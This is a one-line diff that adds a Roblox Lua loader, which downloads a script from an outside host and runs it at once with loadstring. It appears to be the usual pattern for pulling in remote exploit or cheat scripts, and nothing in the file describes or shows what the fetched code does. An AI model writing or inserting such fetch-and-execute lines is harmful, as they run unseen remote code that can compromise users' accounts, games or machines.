@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.obscuravm.com/scripts/3522605706316426411"))()
